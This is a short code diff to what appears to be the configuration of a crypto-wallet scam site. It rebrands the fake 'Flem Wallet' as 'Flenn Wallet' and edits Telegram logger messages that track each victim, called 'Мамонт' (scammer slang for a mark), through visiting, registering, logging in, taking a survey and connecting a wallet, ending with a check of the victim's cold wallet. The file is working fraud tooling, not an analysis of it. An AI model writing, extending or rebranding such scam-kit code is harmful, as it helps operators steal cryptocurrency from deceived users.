@@ -2,19 +2,20 @@
 // * def - default project name
 
 export const projectNames = {
-    def: "Flem",
-    defCaps: "FLEM",
-    defWallet: "Flem Wallet",
-    defCapsWallet: "FLEM Wallet",
-    defWalletLtd: "Flem Wallet LTD",
+    def: "Flenn",
+    defCaps: "FLENN",
+    defWallet: "Flenn Wallet",
+    defCapsWallet: "FLENN Wallet",
+    defWalletLtd: "Flenn Wallet LTD",
 };
-export const curPromoCount: number = 70;
+export const curPromoCount: number = 60;
 
 // * Data for TG logger
 export const logMessages = {
-    visited: `Мамонт <b>перешел на сайт</b>`,
+    visited: `Мамонт перешел на <b>страницу регистрации</b>`,
     startRegister: `Мамонт <b>регистрируется</b>`,
     registered: `Мамонт <b>зарегистрировался</b>`,
+    authorized: `Мамонт <b>вошел в кабинет</b>`,
     survey: `Мамонт <b>прошёл опрос</b>`,
     walletConnect: `<b><u>Кошелёк добавлен.</u></b> Проверяю холодок...`,
 };
